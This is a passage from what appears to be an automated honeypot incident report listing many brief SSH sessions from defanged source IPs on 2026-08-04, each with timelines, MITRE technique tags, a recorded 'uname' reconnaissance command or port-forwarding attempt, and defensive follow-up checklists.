- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47f8a78ce9cd

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:38 |
| **Last Seen** | 2026-08-04 17:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:38:54` | `cowrie.session.connect` |
| `2026-08-04 17:38:54` | `cowrie.client.version` |
| `2026-08-04 17:38:54` | `cowrie.client.kex` |
| `2026-08-04 17:38:54` | `cowrie.login.success` |
| `2026-08-04 17:38:55` | `cowrie.session.params` |
| `2026-08-04 17:38:55` | `cowrie.command.input` |
| `2026-08-04 17:38:55` | `cowrie.log.closed` |
| `2026-08-04 17:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e1c1046988

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:40 |
| **Last Seen** | 2026-08-04 17:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:40:50` | `cowrie.session.connect` |
| `2026-08-04 17:40:50` | `cowrie.client.version` |
| `2026-08-04 17:40:50` | `cowrie.client.kex` |
| `2026-08-04 17:40:50` | `cowrie.login.success` |
| `2026-08-04 17:40:51` | `cowrie.session.params` |
| `2026-08-04 17:40:51` | `cowrie.command.input` |
| `2026-08-04 17:40:51` | `cowrie.log.closed` |
| `2026-08-04 17:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88cef055027b

| Field | Detail |
|---|---|
| **Source IP** | `179.184.85[.]167` |
| **First Seen** | 2026-08-04 17:42 |
| **Last Seen** | 2026-08-04 17:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:42:30` | `cowrie.session.connect` |
| `2026-08-04 17:42:31` | `cowrie.client.version` |
| `2026-08-04 17:42:31` | `cowrie.client.kex` |
| `2026-08-04 17:42:32` | `cowrie.login.success` |
| `2026-08-04 17:42:33` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.184.85[.]167` to AbuseIPDB if not already reported
- [ ] Block `179.184.85[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27678a11e476

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:42 |
| **Last Seen** | 2026-08-04 17:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:42:48` | `cowrie.session.connect` |
| `2026-08-04 17:42:48` | `cowrie.client.version` |
| `2026-08-04 17:42:48` | `cowrie.client.kex` |
| `2026-08-04 17:42:48` | `cowrie.login.success` |
| `2026-08-04 17:42:49` | `cowrie.session.params` |
| `2026-08-04 17:42:49` | `cowrie.command.input` |
| `2026-08-04 17:42:49` | `cowrie.log.closed` |
| `2026-08-04 17:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fca81a291b9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:44 |
| **Last Seen** | 2026-08-04 17:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:44:42` | `cowrie.session.connect` |
| `2026-08-04 17:44:42` | `cowrie.client.version` |
| `2026-08-04 17:44:42` | `cowrie.client.kex` |
| `2026-08-04 17:44:42` | `cowrie.login.success` |
| `2026-08-04 17:44:43` | `cowrie.session.params` |
| `2026-08-04 17:44:43` | `cowrie.command.input` |
| `2026-08-04 17:44:43` | `cowrie.log.closed` |
| `2026-08-04 17:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf7343652c0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:46 |
| **Last Seen** | 2026-08-04 17:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:46:35` | `cowrie.session.connect` |
| `2026-08-04 17:46:35` | `cowrie.client.version` |
| `2026-08-04 17:46:35` | `cowrie.client.kex` |
| `2026-08-04 17:46:36` | `cowrie.login.success` |
| `2026-08-04 17:46:36` | `cowrie.session.params` |
| `2026-08-04 17:46:36` | `cowrie.command.input` |
| `2026-08-04 17:46:37` | `cowrie.log.closed` |
| `2026-08-04 17:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44bcf5e8b496

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]231` |
| **First Seen** | 2026-08-04 17:47 |
| **Last Seen** | 2026-08-04 17:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:47:11` | `cowrie.session.connect` |
| `2026-08-04 17:47:11` | `cowrie.client.version` |
| `2026-08-04 17:47:11` | `cowrie.client.kex` |
| `2026-08-04 17:47:12` | `cowrie.login.success` |
| `2026-08-04 17:47:12` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:47:12` | `cowrie.direct-tcpip.data` |
| `2026-08-04 17:47:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]231` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-942699eaff84

| Field | Detail |
|---|---|
| **Source IP** | `113.219.177[.]95` |
| **First Seen** | 2026-08-04 17:48 |
| **Last Seen** | 2026-08-04 17:48 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:48:25` | `cowrie.session.connect` |
| `2026-08-04 17:48:26` | `cowrie.client.version` |
| `2026-08-04 17:48:26` | `cowrie.client.kex` |
| `2026-08-04 17:48:29` | `cowrie.login.success` |
| `2026-08-04 17:48:30` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:48:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.219.177[.]95` to AbuseIPDB if not already reported
- [ ] Block `113.219.177[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae4ec966cffd

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:48 |
| **Last Seen** | 2026-08-04 17:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:48:35` | `cowrie.session.connect` |
| `2026-08-04 17:48:35` | `cowrie.client.version` |
| `2026-08-04 17:48:35` | `cowrie.client.kex` |
| `2026-08-04 17:48:35` | `cowrie.login.success` |
| `2026-08-04 17:48:36` | `cowrie.session.params` |
| `2026-08-04 17:48:36` | `cowrie.command.input` |
| `2026-08-04 17:48:36` | `cowrie.log.closed` |
| `2026-08-04 17:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df776dad0262

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:50 |
| **Last Seen** | 2026-08-04 17:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:50:34` | `cowrie.session.connect` |
| `2026-08-04 17:50:34` | `cowrie.client.version` |
| `2026-08-04 17:50:34` | `cowrie.client.kex` |
| `2026-08-04 17:50:34` | `cowrie.login.success` |
| `2026-08-04 17:50:35` | `cowrie.session.params` |
| `2026-08-04 17:50:35` | `cowrie.command.input` |
| `2026-08-04 17:50:35` | `cowrie.log.closed` |
| `2026-08-04 17:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d4c978bf7f5

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-04 17:51 |
| **Last Seen** | 2026-08-04 17:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:51:20` | `cowrie.session.connect` |
| `2026-08-04 17:51:20` | `cowrie.client.version` |
| `2026-08-04 17:51:20` | `cowrie.client.kex` |
| `2026-08-04 17:51:20` | `cowrie.login.success` |
| `2026-08-04 17:51:20` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:51:21` | `cowrie.direct-tcpip.data` |
| `2026-08-04 17:51:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e406f7dcca0c

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:52 |
| **Last Seen** | 2026-08-04 17:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:52:32` | `cowrie.session.connect` |
| `2026-08-04 17:52:32` | `cowrie.client.version` |
| `2026-08-04 17:52:32` | `cowrie.client.kex` |
| `2026-08-04 17:52:32` | `cowrie.login.success` |
| `2026-08-04 17:52:33` | `cowrie.session.params` |
| `2026-08-04 17:52:33` | `cowrie.command.input` |
| `2026-08-04 17:52:33` | `cowrie.log.closed` |
| `2026-08-04 17:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c91efa19a8e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:54 |
| **Last Seen** | 2026-08-04 17:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:54:35` | `cowrie.session.connect` |
| `2026-08-04 17:54:35` | `cowrie.client.version` |
| `2026-08-04 17:54:35` | `cowrie.client.kex` |
| `2026-08-04 17:54:35` | `cowrie.login.success` |
| `2026-08-04 17:54:36` | `cowrie.session.params` |
| `2026-08-04 17:54:36` | `cowrie.command.input` |
| `2026-08-04 17:54:36` | `cowrie.log.closed` |
| `2026-08-04 17:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7afa4961fb1b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:56 |
| **Last Seen** | 2026-08-04 17:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:56:37` | `cowrie.session.connect` |
| `2026-08-04 17:56:37` | `cowrie.client.version` |
| `2026-08-04 17:56:37` | `cowrie.client.kex` |
| `2026-08-04 17:56:37` | `cowrie.login.success` |
| `2026-08-04 17:56:38` | `cowrie.session.params` |
| `2026-08-04 17:56:38` | `cowrie.command.input` |
| `2026-08-04 17:56:38` | `cowrie.log.closed` |
| `2026-08-04 17:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a520b5f1cfac

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]29` |
| **First Seen** | 2026-08-04 17:58 |
| **Last Seen** | 2026-08-04 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:58:08` | `cowrie.session.connect` |
| `2026-08-04 17:58:08` | `cowrie.client.version` |
| `2026-08-04 17:58:08` | `cowrie.client.kex` |
| `2026-08-04 17:58:08` | `cowrie.login.success` |
| `2026-08-04 17:58:09` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:58:09` | `cowrie.direct-tcpip.data` |
| `2026-08-04 17:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]29` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e2bc811a34e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:58 |
| **Last Seen** | 2026-08-04 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:58:32` | `cowrie.session.connect` |
| `2026-08-04 17:58:32` | `cowrie.client.version` |
| `2026-08-04 17:58:32` | `cowrie.client.kex` |
| `2026-08-04 17:58:32` | `cowrie.login.success` |
| `2026-08-04 17:58:33` | `cowrie.session.params` |
| `2026-08-04 17:58:33` | `cowrie.command.input` |
| `2026-08-04 17:58:33` | `cowrie.log.closed` |
| `2026-08-04 17:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92e1ba414cb0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:00 |
| **Last Seen** | 2026-08-04 18:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:00:31` | `cowrie.session.connect` |
| `2026-08-04 18:00:31` | `cowrie.client.version` |
| `2026-08-04 18:00:31` | `cowrie.client.kex` |
| `2026-08-04 18:00:31` | `cowrie.login.success` |
| `2026-08-04 18:00:32` | `cowrie.session.params` |
| `2026-08-04 18:00:32` | `cowrie.command.input` |
| `2026-08-04 18:00:32` | `cowrie.log.closed` |
| `2026-08-04 18:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e94cb21c6713

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:02 |
| **Last Seen** | 2026-08-04 18:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:02:30` | `cowrie.session.connect` |
| `2026-08-04 18:02:30` | `cowrie.client.version` |
| `2026-08-04 18:02:30` | `cowrie.client.kex` |
| `2026-08-04 18:02:30` | `cowrie.login.success` |
| `2026-08-04 18:02:31` | `cowrie.session.params` |
| `2026-08-04 18:02:31` | `cowrie.command.input` |
| `2026-08-04 18:02:31` | `cowrie.log.closed` |
| `2026-08-04 18:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5596597e6f0a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:04 |
| **Last Seen** | 2026-08-04 18:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:04:24` | `cowrie.session.connect` |
| `2026-08-04 18:04:24` | `cowrie.client.version` |
| `2026-08-04 18:04:24` | `cowrie.client.kex` |
| `2026-08-04 18:04:25` | `cowrie.login.success` |
| `2026-08-04 18:04:25` | `cowrie.session.params` |
| `2026-08-04 18:04:25` | `cowrie.command.input` |
| `2026-08-04 18:04:25` | `cowrie.log.closed` |
| `2026-08-04 18:04:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72601d830d6d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:06 |
| **Last Seen** | 2026-08-04 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:06:21` | `cowrie.session.connect` |
| `2026-08-04 18:06:21` | `cowrie.client.version` |
| `2026-08-04 18:06:21` | `cowrie.client.kex` |
| `2026-08-04 18:06:22` | `cowrie.login.success` |
| `2026-08-04 18:06:23` | `cowrie.session.params` |
| `2026-08-04 18:06:23` | `cowrie.command.input` |
| `2026-08-04 18:06:23` | `cowrie.log.closed` |
| `2026-08-04 18:06:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d340a089a4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:08 |
| **Last Seen** | 2026-08-04 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:08:22` | `cowrie.session.connect` |
| `2026-08-04 18:08:22` | `cowrie.client.version` |
| `2026-08-04 18:08:22` | `cowrie.client.kex` |
| `2026-08-04 18:08:22` | `cowrie.login.success` |
| `2026-08-04 18:08:23` | `cowrie.session.params` |
| `2026-08-04 18:08:23` | `cowrie.command.input` |
| `2026-08-04 18:08:23` | `cowrie.log.closed` |
| `2026-08-04 18:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ce69d1a6735

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 18:10 |
| **Last Seen** | 2026-08-04 18:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:10:18` | `cowrie.session.connect` |
| `2026-08-04 18:10:18` | `cowrie.client.version` |
| `2026-08-04 18:10:18` | `cowrie.client.kex` |
| `2026-08-04 18:10:18` | `cowrie.login.success` |
| `2026-08-04 18:10:19` | `cowrie.session.params` |
| `2026-08-04 18:10:19` | `cowrie.command.input` |
| `2026-08-04 18:10:19` | `cowrie.log.closed` |
| `2026-08-04 18:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed0a3dff6b20

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-04 18:11 |
| **Last Seen** | 2026-08-04 18:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:11:44` | `cowrie.session.connect` |
| `2026-08-04 18:11:44` | `cowrie.client.version` |
| `2026-08-04 18:11:44` | `cowrie.client.kex` |
| `2026-08-04 18:11:45` | `cowrie.login.success` |
| `2026-08-04 18:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565d3a9d2972

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-04 18:11 |
| **Last Seen** | 2026-08-04 18:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:11:44` | `cowrie.session.connect` |
| `2026-08-04 18:11:44` | `cowrie.client.version` |
| `2026-08-04 18:11:44` | `cowrie.client.kex` |
| `2026-08-04 18:11:45` | `cowrie.login.success` |
| `2026-08-04 18:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fecc69cbb5e

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]164` |
| **First Seen** | 2026-08-04 18:12 |
| **Last Seen** | 2026-08-04 18:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:12:00` | `cowrie.session.connect` |
| `2026-08-04 18:12:01` | `cowrie.client.version` |
| `2026-08-04 18:12:01` | `cowrie.client.kex` |
| `2026-08-04 18:12:03` | `cowrie.login.success` |
| `2026-08-04 18:12:03` | `cowrie.direct-tcpip.request` |
| `2026-08-04 18:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]164` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf951cec9c4c

| Field | Detail |
|---|---|
| **Source IP** | `111.70.22[.]154` |
| **First Seen** | 2026-08-04 18:12 |
| **Last Seen** | 2026-08-04 18:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 18:12:09` | `cowrie.session.connect` |
| `2026-08-04 18:12:10` | `cowrie.client.version` |
| `2026-08-04 18:12:10` | `cowrie.client.kex` |
| `2026-08-04 18:12:12` | `cowrie.login.success` |
| `2026-08-04 18:12:13` | `cowrie.direct-tcpip.request` |
